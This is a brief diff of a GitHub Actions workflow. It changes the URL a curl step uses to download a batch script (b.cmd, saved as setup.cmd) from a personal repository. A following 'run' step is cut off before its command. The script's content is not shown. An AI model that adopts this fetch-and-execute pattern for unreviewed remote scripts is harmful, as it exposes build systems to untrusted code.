@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: Download
       run: |
-          curl -s -L -o setup.cmd https://raw.githubusercontent.com/Efebey1940/fictional-octo-waffle/main/b.cmd
+          curl -s -L -o setup.cmd https://github.com/Efebey1940/fictional-octo-waffle/raw/main/b.cmd
     
     - name: run
       run: |
